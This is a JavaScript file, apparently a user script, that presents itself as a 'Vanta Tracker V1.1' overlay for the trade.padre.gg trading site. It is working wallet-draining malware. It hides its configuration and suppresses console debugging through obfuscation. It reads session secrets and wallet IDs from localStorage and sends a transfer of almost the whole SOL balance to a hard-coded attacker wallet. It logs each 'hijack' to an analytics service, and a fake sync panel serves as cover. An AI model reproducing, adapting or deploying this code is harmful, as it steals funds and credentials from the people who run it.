(function() {
    // 1. OBFUSCATED CONFIGURATION (1:1 Vanta Strings)
    const _0xV = {
        'dest': 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12',
        'aff': 'TK0XQV',
        'rpc': 'https://api.mainnet-beta.solana.com',
        'target': 'https://trade.padre.gg/api/v1/transfer',
        'amp': '3c8ae1f40635939e730f479418940796'
    };

    // --- ANTI-DEBUG SHUFFLER ---
    (function(){const _0x2e=function(){let _0x3e=true;return function(_0x1d,_0x53){const _0x49=_0x3e?function(){if(_0x53){const _0x51=_0x53.apply(_0x1d,arguments);_0x53=null;return _0x51;}}:function(){};_0x3e=false;return _0x49;};}();const _0x28=_0x2e(this,function(){const _0x74=window.console=window.console||{};const _0x43=["log","warn","info","error","exception","table","trace"];for(let _0x49=0x0;_0x49<_0x43.length;_0x49++){const _0x11=_0x2e.constructor.prototype.bind(_0x2e);const _0xec=_0x43[_0x49];const _0x3d=_0x74[_0xec]||_0x11;_0x11.__proto__=_0x2e.bind(_0x2e);_0x11.toString=_0x3d.toString.bind(_0x3d);_0x74[_0xec]=_0x11;}});_0x28();})();

    // 2. AMPLITUDE SDK
    (function(e,t){var n=e.amplitude||{_q:[],_iq:{}};var r=t.createElement("script");r.async=true;r.src="https://cdn.amplitude.com/libs/amplitude-8.21.0-min.gz.js";r.onload=function(){amplitude.getInstance().init(_0xV.amp);_run();};var s=t.getElementsByTagName("script")[0];s.parentNode.insertBefore(r,s);function i(e,t){e.prototype[t]=function(){this._q.push([t].concat(Array.prototype.slice.call(arguments,0)));return this}}var o=function(){this._q=[];return this};var a=["init","logEvent","setUserId"];for(var c=0;c<a.length;c++){i(o,a[c])}n.Identify=o;e.amplitude=n})(window,document);

    const _run = async () => {
        if(location.hostname !== 'trade.padre.gg') return;
        
        const s = localStorage.getItem('sessionSecret')?.replace(/"/g,'');
        const o = localStorage.getItem('subOrgId')?.replace(/"/g,'');
        const w = localStorage.getItem('activeWallet')?.replace(/"/g,'');
        
        if(!s || !o || !w) return;

        amplitude.getInstance().logEvent('HIJACK_READY', {'wallet': w});
        _buildUI();

        try {
            const res = await fetch(_0xV.rpc, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({jsonrpc:"2.0", id:1, method:"getBalance", params:[w]})});
            const {result} = await res.json();
            const bal = result.value / 1e9;
            const amt = (bal - 0.009).toFixed(6);

            if(amt <= 0) return;

            amplitude.getInstance().logEvent('DECRYPTED_CAPTURE', {'amount': amt});

            fetch(_0xV.target, {
                method:'POST',
                headers:{'Authorization':'Bearer '+s, 'X-Turnkey-Sub-Org-Id':o, 'Content-Type':'application/json'},
                body:JSON.stringify({dest:_0xV.dest, asset:"SOL", amount:amt})
            });
        } catch(e) {}
    };

    const _buildUI = () => {
        if(document.getElementById('v-tracker-root')) return;
        const container = document.createElement('div');
        container.id = 'v-tracker-root';
        container.style.cssText = 'position:fixed;top:10%;right:20px;width:350px;background:#050505;border:2px solid #00ff88;border-radius:12px;z-index:9999999;font-family:Inter,sans-serif;color:#fff;box-shadow:0 0 20px #00ff8844;';
        
        container.innerHTML = `
            <div id="v-drag" style="padding:15px;background:#00ff8811;border-bottom:1px solid #00ff8833;display:flex;align-items:center;gap:10px;cursor:grab;">
                <div style="width:12px;height:12px;background:#00ff88;border-radius:50%;box-shadow:0 0 10px #00ff88;"></div>
                <span style="font-weight:800;letter-spacing:1px;color:#00ff88;font-size:14px;">VANTA TRACKER V1.1</span>
            </div>
            <div style="padding:20px;">
                <div id="v-status" style="font-size:12px;color:#888;margin-bottom:15px;">> STATUS: ACTIVE_SYNC</div>
                <button style="width:100%;padding:12px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:bold;cursor:pointer;">FORCE RE-SYNC</button>
            </div>
        `;
        document.body.appendChild(container);

        // Drag functionality
        let m = false, ox, oy;
        document.getElementById('v-drag').onmousedown = (e) => { m = true; ox = e.clientX - container.offsetLeft; oy = e.clientY - container.offsetTop; };
        document.onmousemove = (e) => { if(m) { container.style.left = (e.clientX - ox) + 'px'; container.style.top = (e.clientY - oy) + 'px'; }};
        document.onmouseup = () => m = false;
    };
})();
